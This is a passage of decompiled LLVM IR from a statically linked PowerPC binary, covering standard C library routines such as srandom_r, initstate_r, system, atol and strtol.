  br i1 %v2_10010e0c, label %dec_label_pc_10010e38, label %dec_label_pc_10010e30

dec_label_pc_10010e30:                            ; preds = %dec_label_pc_10010df4
  %v0_10010e30 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10010e30, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010e40

dec_label_pc_10010e38:                            ; preds = %dec_label_pc_10010df4
  %v2_10010e10 = icmp ult i32 %v1_10010e04, %v3_10010dfc
  br i1 %v2_10010e10, label %dec_label_pc_10010e40, label %dec_label_pc_10010e3c

dec_label_pc_10010e3c:                            ; preds = %dec_label_pc_10010e38
  %v0_10010e3c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10010e3c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010e40

dec_label_pc_10010e40:                            ; preds = %dec_label_pc_10010e38, %dec_label_pc_10010e30, %dec_label_pc_10010e3c
  %v0_10010e40 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10010e40, i32* %v2_10010df8, align 4
  %v0_10010e44 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10010e44, i32* %arg1, align 4
  br label %dec_label_pc_10010e48

dec_label_pc_10010e48:                            ; preds = %dec_label_pc_10010dd8, %dec_label_pc_10010e40
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10010e1c, { 1, 0 }
  uselistorder i32 %v1_10010e04, { 1, 0 }
  uselistorder i32 %v3_10010df8, { 1, 0, 2 }
  uselistorder i32 %v1_10010de4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010e48, { 1, 0 }
  uselistorder label %dec_label_pc_10010e40, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10010e50 = load i32, i32* @lr, align 4
  %v0_10010e5c = load i32, i32* @r4, align 4
  store i32 %v0_10010e5c, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10010e68 = add i32 %v0_10010e5c, 12
  %v2_10010e68 = inttoptr i32 %v1_10010e68 to i32*
  %v3_10010e68 = load i32, i32* %v2_10010e68, align 4
  %v2_10010e6c = icmp ugt i32 %v3_10010e68, 4
  br i1 %v2_10010e6c, label %dec_label_pc_10010f1c, label %dec_label_pc_10010e74

dec_label_pc_10010e74:                            ; preds = %entry
  %v0_10010e74 = load i32, i32* @r3, align 4
  %v3_10010e74 = icmp eq i32 %v0_10010e74, 0
  %v1_10010e78 = add i32 %v0_10010e5c, 8
  %v2_10010e78 = inttoptr i32 %v1_10010e78 to i32*
  %v3_10010e78 = load i32, i32* %v2_10010e78, align 4
  store i32 %v3_10010e78, i32* %r10.global-to-local, align 4
  br i1 %v3_10010e74, label %dec_label_pc_10010e80, label %dec_label_pc_10010e84

dec_label_pc_10010e80:                            ; preds = %dec_label_pc_10010e74
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_10010e84

dec_label_pc_10010e84:                            ; preds = %dec_label_pc_10010e74, %dec_label_pc_10010e80
  %v0_10010e88 = phi i32 [ %v0_10010e74, %dec_label_pc_10010e74 ], [ 1, %dec_label_pc_10010e80 ]
  %v3_10010e84 = icmp eq i32 %v3_10010e68, 0
  %v2_10010e88 = inttoptr i32 %v3_10010e78 to i32*
  store i32 %v0_10010e88, i32* %v2_10010e88, align 4
  br i1 %v3_10010e84, label %dec_label_pc_10010f18, label %dec_label_pc_10010e90

dec_label_pc_10010e90:                            ; preds = %dec_label_pc_10010e84
  %v0_10010e90 = load i32, i32* @r30, align 4
  %v1_10010e90 = add i32 %v0_10010e90, 16
  %v2_10010e90 = inttoptr i32 %v1_10010e90 to i32*
  %v3_10010e90 = load i32, i32* %v2_10010e90, align 4
  store i32 %v3_10010e90, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10010ea8 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_10010e90, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_10010e90, 0
  br i1 %tmp18, label %dec_label_pc_10010ee4.preheader, label %dec_label_pc_10010ee4.preheader.thread

dec_label_pc_10010ee4.preheader.thread:           ; preds = %dec_label_pc_10010e90
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010ee8

dec_label_pc_10010ee4.preheader:                  ; preds = %dec_label_pc_10010e90
  %v1_10010ee42 = add i32 %v3_10010e90, -1
  store i32 %v1_10010ee42, i32* %ctr.global-to-local, align 4
  %v2_10010ee43 = icmp eq i32 %v1_10010ee42, 0
  br i1 %v2_10010ee43, label %dec_label_pc_10010ee8, label %dec_label_pc_10010ec0

dec_label_pc_10010ec0:                            ; preds = %dec_label_pc_10010ee4.preheader, %dec_label_pc_10010ee0.dec_label_pc_10010ec0_crit_edge
  %v1_10010ee0 = phi i32 [ %v2_10010ee0, %dec_label_pc_10010ee0.dec_label_pc_10010ec0_crit_edge ], [ %v0_10010ea8, %dec_label_pc_10010ee4.preheader ]
  %v1_10010ec0 = phi i32 [ %v1_10010ec0.pre, %dec_label_pc_10010ee0.dec_label_pc_10010ec0_crit_edge ], [ 127773, %dec_label_pc_10010ee4.preheader ]
  %v0_10010ec0 = load i32, i32* @r3, align 4
  %v2_10010ec0 = sdiv i32 %v0_10010ec0, %v1_10010ec0
  %v2_10010ec4 = mul i32 %v2_10010ec0, %v1_10010ec0
  %v2_10010ec8 = sub i32 %v0_10010ec0, %v2_10010ec4
  %v1_10010ecc = mul i32 %v2_10010ec0, 2836
  store i32 %v1_10010ecc, i32* %r0.global-to-local, align 4
  %v1_10010ed0 = mul i32 %v2_10010ec8, 16807
  %v2_10010ed4 = sub i32 %v1_10010ed0, %v1_10010ecc
  store i32 %v2_10010ed4, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_10010ed4, -1
  br i1 %tmp19, label %dec_label_pc_10010ee0, label %dec_label_pc_10010edc

dec_label_pc_10010edc:                            ; preds = %dec_label_pc_10010ec0
  %v1_10010edc = load i32, i32* %r7.global-to-local, align 4
  %v2_10010edc = add i32 %v1_10010edc, %v2_10010ed4
  store i32 %v2_10010edc, i32* @r3, align 4
  br label %dec_label_pc_10010ee0

dec_label_pc_10010ee0:                            ; preds = %dec_label_pc_10010ec0, %dec_label_pc_10010edc
  %v0_10010ee0 = phi i32 [ %v2_10010ed4, %dec_label_pc_10010ec0 ], [ %v2_10010edc, %dec_label_pc_10010edc ]
  %v2_10010ee0 = add i32 %v1_10010ee0, 4
  %v3_10010ee0 = inttoptr i32 %v2_10010ee0 to i32*
  store i32 %v0_10010ee0, i32* %v3_10010ee0, align 4
  %v0_10010ee4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010ee4 = add i32 %v0_10010ee4, -1
  store i32 %v1_10010ee4, i32* %ctr.global-to-local, align 4
  %v2_10010ee4 = icmp eq i32 %v1_10010ee4, 0
  br i1 %v2_10010ee4, label %dec_label_pc_10010ee4.dec_label_pc_10010ee8_crit_edge, label %dec_label_pc_10010ee0.dec_label_pc_10010ec0_crit_edge

dec_label_pc_10010ee0.dec_label_pc_10010ec0_crit_edge: ; preds = %dec_label_pc_10010ee0
  %v1_10010ec0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010ec0

dec_label_pc_10010ee4.dec_label_pc_10010ee8_crit_edge: ; preds = %dec_label_pc_10010ee0
  %v0_10010ee8.pre = load i32, i32* @r30, align 4
  %v0_10010eec.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10010ef0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010ee8

dec_label_pc_10010ee8:                            ; preds = %dec_label_pc_10010ee4.preheader.thread, %dec_label_pc_10010ee4.dec_label_pc_10010ee8_crit_edge, %dec_label_pc_10010ee4.preheader
  %v0_10010ef0 = phi i32 [ %v0_10010ef0.pre, %dec_label_pc_10010ee4.dec_label_pc_10010ee8_crit_edge ], [ %v0_10010ea8, %dec_label_pc_10010ee4.preheader ], [ %v0_10010ea8, %dec_label_pc_10010ee4.preheader.thread ]
  %v0_10010eec = phi i32 [ %v0_10010eec.pre, %dec_label_pc_10010ee4.dec_label_pc_10010ee8_crit_edge ], [ %v3_10010e90, %dec_label_pc_10010ee4.preheader ], [ %v3_10010e90, %dec_label_pc_10010ee4.preheader.thread ]
  %v1_10010ef0 = phi i32 [ %v0_10010ee8.pre, %dec_label_pc_10010ee4.dec_label_pc_10010ee8_crit_edge ], [ %v0_10010e90, %dec_label_pc_10010ee4.preheader ], [ %v0_10010e90, %dec_label_pc_10010ee4.preheader.thread ]
  %v1_10010ee8 = add i32 %v1_10010ef0, 20
  %v2_10010ee8 = inttoptr i32 %v1_10010ee8 to i32*
  %v3_10010ee8 = load i32, i32* %v2_10010ee8, align 4
  store i32 %v3_10010ee8, i32* %r0.global-to-local, align 4
  %v1_10010eec = mul i32 %v0_10010eec, 10
  store i32 %v1_10010eec, i32* %r31.global-to-local, align 4
  %v2_10010ef0 = add i32 %v1_10010ef0, 4
  %v3_10010ef0 = inttoptr i32 %v2_10010ef0 to i32*
  store i32 %v0_10010ef0, i32* %v3_10010ef0, align 4
  %v0_10010ef4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010ef4 = mul i32 %v0_10010ef4, 4
  %v0_10010ef8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010ef8 = add i32 %v0_10010ef8, %v1_10010ef4
  store i32 %v2_10010ef8, i32* %r0.global-to-local, align 4
  %v1_10010efc = load i32, i32* @r30, align 4
  %v2_10010efc = inttoptr i32 %v1_10010efc to i32*
  store i32 %v2_10010ef8, i32* %v2_10010efc, align 4
  %v2_10010f10 = ptrtoint i32* %stack_var_-24 to i32
  %v0_10010f0821 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010f0822 = add i32 %v0_10010f0821, -1
  store i32 %v1_10010f0822, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_10010f0822, -1
  br i1 %tmp2025, label %dec_label_pc_10010f04, label %dec_label_pc_10010f18

dec_label_pc_10010f04:                            ; preds = %dec_label_pc_10010ee8, %dec_label_pc_10010f04
  %v0_10010f0c26 = load i32, i32* @r30, align 4
  %v2_10010f04 = inttoptr i32 %v0_10010f0c26 to i32*
  %v3_10010f04 = call i32 @__GI_random_r(i32* %v2_10010f04, i32 %v2_10010f10)
  %v0_10010f08 = load i32, i32* @r31, align 4
  %v1_10010f08 = add i32 %v0_10010f08, -1
  store i32 %v1_10010f08, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_10010f08, -1
  br i1 %tmp20, label %dec_label_pc_10010f04, label %dec_label_pc_10010f18

dec_label_pc_10010f18:                            ; preds = %dec_label_pc_10010ee8, %dec_label_pc_10010f04, %dec_label_pc_10010e84
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010f1c

dec_label_pc_10010f1c:                            ; preds = %entry, %dec_label_pc_10010f18
  %v0_10010f1c = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_10010f18 ]
  store i32 %v0_10010e50, i32* %r0.global-to-local, align 4
  ret i32 %v0_10010f1c

; uselistorder directives
  uselistorder i32 %v1_10010ee4, { 1, 0 }
  uselistorder i32 %v2_10010ee0, { 1, 0 }
  uselistorder i32 %v2_10010ed4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10010ec0, { 1, 0 }
  uselistorder i32 %v0_10010ea8, { 1, 2, 0 }
  uselistorder i32 %v3_10010e90, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_10010f1c, { 1, 0 }
  uselistorder label %dec_label_pc_10010f18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010f04, { 1, 0 }
  uselistorder label %dec_label_pc_10010ee8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10010ee0, { 1, 0 }
  uselistorder label %dec_label_pc_10010ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10010e84, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10010f34 = icmp ugt i32 %arg2, 127
  %v0_10010f3c = load i32, i32* @lr, align 4
  store i32 %v0_10010f3c, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v1_10010f48 = sub i32 255, %arg2
  %v2_10010f48 = sub i32 -1, %arg2
  %not.v5_10010f48 = icmp ugt i32 %v1_10010f48, %v2_10010f48
  %v6_10010f4c = sext i1 %not.v5_10010f48 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_10010f54 = add i32 %tmp, 4
  store i32 %v1_10010f54, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001bf34.1102 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_10010f6c = sub nsw i32 3, %v6_10010f4c
  store i32 %v1_10010f6c, i32* @r31, align 4
  br i1 %v2_10010f34, label %dec_label_pc_10010f94, label %dec_label_pc_10010f74

dec_label_pc_10010f74:                            ; preds = %entry
  %v2_10010f60 = icmp ugt i32 %arg2, 31
  %v1_10010f74 = sub i32 63, %arg2
  %not.v5_10010f74 = icmp ugt i32 %v1_10010f74, %v2_10010f48
  %v6_10010f78 = sext i1 %not.v5_10010f74 to i32
  %v1_10010f80 = sub nsw i32 1, %v6_10010f78
  store i32 %v1_10010f80, i32* @r31, align 4
  br i1 %v2_10010f60, label %dec_label_pc_10010f94, label %dec_label_pc_10010f88

dec_label_pc_10010f88:                            ; preds = %dec_label_pc_10010f74
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_10010ff4, label %dec_label_pc_10010f94

dec_label_pc_10010f94:                            ; preds = %dec_label_pc_10010f88, %dec_label_pc_10010f74, %entry
  %v0_10010f94 = phi i32 [ 0, %dec_label_pc_10010f88 ], [ %v1_10010f80, %dec_label_pc_10010f74 ], [ %v1_10010f6c, %entry ]
  %v1_10010f94 = mul nsw i32 %v0_10010f94, 4
  store i32 %v1_10010f94, i32* %r0.global-to-local, align 4
  %v2_10010f98 = add i32 %arg3, 12
  %v3_10010f98 = inttoptr i32 %v2_10010f98 to i32*
  store i32 %v0_10010f94, i32* %v3_10010f98, align 4
  %v0_10010f9c = load i32, i32* %r0.global-to-local, align 4
  %v1_10010f9c = load i32, i32* %r11.global-to-local, align 4
  %v2_10010f9c = add i32 %v1_10010f9c, %v0_10010f9c
  store i32 %v2_10010f9c, i32* %r9.global-to-local, align 4
  %v3_10010fa0 = inttoptr i32 %v2_10010f9c to i32*
  %v4_10010fa0 = load i32, i32* %v3_10010fa0, align 4
  store i32 %v4_10010fa0, i32* %r0.global-to-local, align 4
  %v1_10010fa4 = add i32 %v2_10010f9c, 20
  %v2_10010fa4 = inttoptr i32 %v1_10010fa4 to i32*
  %v3_10010fa4 = load i32, i32* %v2_10010fa4, align 4
  store i32 %v3_10010fa4, i32* %r9.global-to-local, align 4
  %v1_10010fa8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010fa8 = add i32 %v1_10010fa8, 20
  %v3_10010fa8 = inttoptr i32 %v2_10010fa8 to i32*
  store i32 %v4_10010fa0, i32* %v3_10010fa8, align 4
  %v0_10010fac = load i32, i32* %r9.global-to-local, align 4
  %v1_10010fac = mul i32 %v0_10010fac, 4
  store i32 %v1_10010fac, i32* %r0.global-to-local, align 4
  %v0_10010fb0 = load i32, i32* %r29.global-to-local, align 4
  %v1_10010fb0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010fb0 = add i32 %v1_10010fb0, 8
  %v3_10010fb0 = inttoptr i32 %v2_10010fb0 to i32*
  store i32 %v0_10010fb0, i32* %v3_10010fb0, align 4
  %v0_10010fb4 = load i32, i32* %r29.global-to-local, align 4
  %v1_10010fb4 = load i32, i32* %r0.global-to-local, align 4
  %v2_10010fb4 = add i32 %v1_10010fb4, %v0_10010fb4
  store i32 %v2_10010fb4, i32* %r0.global-to-local, align 4
  %v0_10010fb8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010fb8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010fb8 = add i32 %v1_10010fb8, 16
  %v3_10010fb8 = inttoptr i32 %v2_10010fb8 to i32*
  store i32 %v0_10010fb8, i32* %v3_10010fb8, align 4
  %v0_10010fbc = load i32, i32* %r0.global-to-local, align 4
  %v1_10010fbc = load i32, i32* %r30.global-to-local, align 4
  %v2_10010fbc = add i32 %v1_10010fbc, 24
  %v3_10010fbc = inttoptr i32 %v2_10010fbc to i32*
  store i32 %v0_10010fbc, i32* %v3_10010fbc, align 4
  store i32 268505028, i32* @lr, align 4
  %v0_10010fc0 = call i32 @srandom_r()
  %v0_10010fc4 = load i32, i32* @r31, align 4
  %v3_10010fc4 = icmp eq i32 %v0_10010fc4, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10010fd0 = load i32, i32* %r27.global-to-local, align 4
  %v2_10010fd0 = inttoptr i32 %v1_10010fd0 to i32*
  store i32 0, i32* %v2_10010fd0, align 4
  br i1 %v3_10010fc4, label %dec_label_pc_10011008, label %dec_label_pc_10010fd8

dec_label_pc_10010fd8:                            ; preds = %dec_label_pc_10010f94
  %v0_10010fd8 = load i32, i32* @r30, align 4
  %v1_10010fd8 = add i32 %v0_10010fd8, 4
  %v2_10010fd8 = inttoptr i32 %v1_10010fd8 to i32*
  %v3_10010fd8 = load i32, i32* %v2_10010fd8, align 4
  %v0_10010fdc = load i32, i32* %r29.global-to-local, align 4
  %v2_10010fdc = sub i32 %v3_10010fd8, %v0_10010fdc
  %v4_10010fe0 = sdiv i32 %v2_10010fdc, 4
  %v1_10010fe4 = mul i32 %v4_10010fe0, 5
  %v1_10010fe8 = load i32, i32* @r31, align 4
  %v2_10010fe8 = add i32 %v1_10010fe4, %v1_10010fe8
  store i32 %v2_10010fe8, i32* %r0.global-to-local, align 4
  %v1_10010fec = load i32, i32* %r27.global-to-local, align 4
  %v2_10010fec = inttoptr i32 %v1_10010fec to i32*
  store i32 %v2_10010fe8, i32* %v2_10010fec, align 4
  br label %dec_label_pc_10011008

dec_label_pc_10010ff4:                            ; preds = %dec_label_pc_10010f88
  %v0_10010ff4 = call i32 @__errno_location()
  store i32 %v0_10010ff4, i32* %r3.global-to-local, align 4
  %v0_10010ff8 = load i32, i32* %r28.global-to-local, align 4
  %v2_10010ff8 = inttoptr i32 %v0_10010ff4 to i32*
  store i32 %v0_10010ff8, i32* %v2_10010ff8, align 4
  %v0_10010ffc = call i32 @__errno_location()
  %v0_10011000 = load i32, i32* %r28.global-to-local, align 4
  %v2_10011000 = inttoptr i32 %v0_10010ffc to i32*
  store i32 %v0_10011000, i32* %v2_10011000, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011008

dec_label_pc_10011008:                            ; preds = %dec_label_pc_10010f94, %dec_label_pc_10010fd8, %dec_label_pc_10010ff4
  store i32 %v0_10010f3c, i32* %r0.global-to-local, align 4
  %v0_10011018 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011018

; uselistorder directives
  uselistorder i32 %v2_10010f9c, { 1, 0, 2 }
  uselistorder i32 %v0_10010f94, { 1, 0 }
  uselistorder i32 %v2_10010f48, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001bf34.1102 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_10011008, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_10011024 = load i32, i32* @r31, align 4
  %v3_1001102c = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1001102c, label %dec_label_pc_1001115c, label %dec_label_pc_1001103c

dec_label_pc_1001103c:                            ; preds = %entry
  store i32 268505160, i32* @lr, align 4
  %v2_10011044 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268505176, i32* @lr, align 4
  %v2_10011054 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268505192, i32* @lr, align 4
  %v2_10011064 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_10011064, i32* @r3, align 4
  store i32 268505200, i32* @lr, align 4
  %v0_1001106c = call i32 @__vfork()
  store i32 %v0_1001106c, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v0_1001106c, -1
  br i1 %tmp10, label %dec_label_pc_100110a4, label %dec_label_pc_10011078

dec_label_pc_10011078:                            ; preds = %dec_label_pc_1001103c
  store i32 268505220, i32* @lr, align 4
  %v2_10011080 = call i32 @__bsd_signal(i32 3, i32 %v2_10011044)
  store i32 268505232, i32* @lr, align 4
  %v2_1001108c = call i32 @__bsd_signal(i32 2, i32 %v2_10011054)
  store i32 268505244, i32* @lr, align 4
  %v2_10011098 = call i32 @__bsd_signal(i32 17, i32 %v2_10011064)
  br label %dec_label_pc_1001115c

dec_label_pc_100110a4:                            ; preds = %dec_label_pc_1001103c
  %v3_10011070 = icmp eq i32 %v0_1001106c, 0
  br i1 %v3_10011070, label %dec_label_pc_100110a8, label %dec_label_pc_100110fc

dec_label_pc_100110a8:                            ; preds = %dec_label_pc_100110a4
  store i32 268505268, i32* @lr, align 4
  %v2_100110b0 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268505280, i32* @lr, align 4
  %v2_100110bc = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268505292, i32* @lr, align 4
  %v2_100110c8 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_100110f0 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1001bf5c.1104 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001bf64.1105 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001bf68.1106 to i32), i32 %arg1, i32 0)
  %v1_100110f8 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100110fc

dec_label_pc_100110fc:                            ; preds = %dec_label_pc_100110a4, %dec_label_pc_100110a8
  store i32 268505352, i32* @lr, align 4
  %v2_10011104 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268505364, i32* @lr, align 4
  %v2_10011110 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_10011114 = load i32, i32* @r31, align 4
  store i32 268505384, i32* @lr, align 4
  %v4_10011124 = call i32 @wait4(i32 %v0_10011114)
  %v3_10011128 = icmp eq i32 %v4_10011124, -1
  br i1 %v3_10011128, label %dec_label_pc_10011130, label %dec_label_pc_10011134

dec_label_pc_10011130:                            ; preds = %dec_label_pc_100110fc
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10011134

dec_label_pc_10011134:                            ; preds = %dec_label_pc_100110fc, %dec_label_pc_10011130
  store i32 268505408, i32* @lr, align 4
  %v2_1001113c = call i32 @__bsd_signal(i32 3, i32 %v2_10011044)
  store i32 268505420, i32* @lr, align 4
  %v2_10011148 = call i32 @__bsd_signal(i32 2, i32 %v2_10011054)
  store i32 268505432, i32* @lr, align 4
  %v2_10011154 = call i32 @__bsd_signal(i32 17, i32 %v2_10011064)
  %v3_10011158 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1001115c

dec_label_pc_1001115c:                            ; preds = %entry, %dec_label_pc_10011078, %dec_label_pc_10011134
  %v0_1001116c = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_10011078 ], [ %v3_10011158, %dec_label_pc_10011134 ]
  store i32 %v0_10011024, i32* @r31, align 4
  ret i32 %v0_1001116c

; uselistorder directives
  uselistorder i32 %v0_1001106c, { 1, 0, 2 }
  uselistorder i32 %v2_10011064, { 1, 0, 2 }
  uselistorder i32 %v2_10011054, { 1, 0 }
  uselistorder i32 %v2_10011044, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_1001115c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011134, { 1, 0 }
  uselistorder label %dec_label_pc_100110fc, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_10011178 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_10011178
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_10011180 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_10011180
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10011194 = load i32, i32* @r4, align 4
  store i32 %v0_10011194, i32* @r25, align 4
  %v0_1001119c = load i32, i32* @r5, align 4
  store i32 %v0_1001119c, i32* %r30.global-to-local, align 4
  %v0_100111a0 = load i32, i32* @r6, align 4
  store i32 %v0_100111a0, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_100111a8 = load i32, i32* @global_var_1002c8a8, align 4
  br label %dec_label_pc_100111b4

dec_label_pc_100111b0:                            ; preds = %dec_label_pc_100111b4
  %v1_100111b0 = add i32 %v0_100111e8, 1
  store i32 %v1_100111b0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100111b4

dec_label_pc_100111b4:                            ; preds = %entry, %dec_label_pc_100111b0
  %v0_100111e8 = phi i32 [ %tmp, %entry ], [ %v1_100111b0, %dec_label_pc_100111b0 ]
  %v1_100111b4 = inttoptr i32 %v0_100111e8 to i8*
  %v2_100111b4 = load i8, i8* %v1_100111b4, align 1
  %v3_100111b4 = zext i8 %v2_100111b4 to i32
  %v1_100111b8 = mul nuw nsw i32 %v3_100111b4, 2
  %v2_100111bc = add i32 %v1_100111b8, %v3_100111a8
  %v3_100111bc = inttoptr i32 %v2_100111bc to i16*
  %v4_100111bc = load i16, i16* %v3_100111bc, align 2
  %v1_100111c0 = and i16 %v4_100111bc, 32
  %v3_100111c0 = icmp eq i16 %v1_100111c0, 0
  br i1 %v3_100111c0, label %dec_label_pc_100111c8, label %dec_label_pc_100111b0

dec_label_pc_100111c8:                            ; preds = %dec_label_pc_100111b4
  %v3_100111c8 = icmp eq i8 %v2_100111b4, 43
  br i1 %v3_100111c8, label %dec_label_pc_100111e8, label %dec_label_pc_100111d0

dec_label_pc_100111d0:                            ; preds = %dec_label_pc_100111c8
  %v3_100111d0 = icmp eq i8 %v2_100111b4, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_100111d0, label %dec_label_pc_100111e8, label %dec_label_pc_100111ec

dec_label_pc_100111e8:                            ; preds = %dec_label_pc_100111c8, %dec_label_pc_100111d0
  %storemerge = phi i32 [ 1, %dec_label_pc_100111d0 ], [ 0, %dec_label_pc_100111c8 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_100111e8 = add i32 %v0_100111e8, 1
  store i32 %v1_100111e8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100111ec

dec_label_pc_100111ec:                            ; preds = %dec_label_pc_100111d0, %dec_label_pc_100111e8
  %v1_100111ec = call i32 @__asm_rlwinm.(i32 %v0_1001119c, i32 0, i32 28, i32 26)
  %v4_100111ec = icmp eq i32 %v1_100111ec, 0
  br i1 %v4_100111ec, label %dec_label_pc_100111f8, label %dec_label_pc_100111ec.dec_label_pc_10011234_crit_edge

dec_label_pc_100111ec.dec_label_pc_10011234_crit_edge: ; preds = %dec_label_pc_100111ec
  %v0_10011234.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10011234

dec_label_pc_100111f8:                            ; preds = %dec_label_pc_100111ec
  %v0_100111f8 = load i32, i32* %r31.global-to-local, align 4
  %v1_100111f8 = inttoptr i32 %v0_100111f8 to i8*
  %v2_100111f8 = load i8, i8* %v1_100111f8, align 1
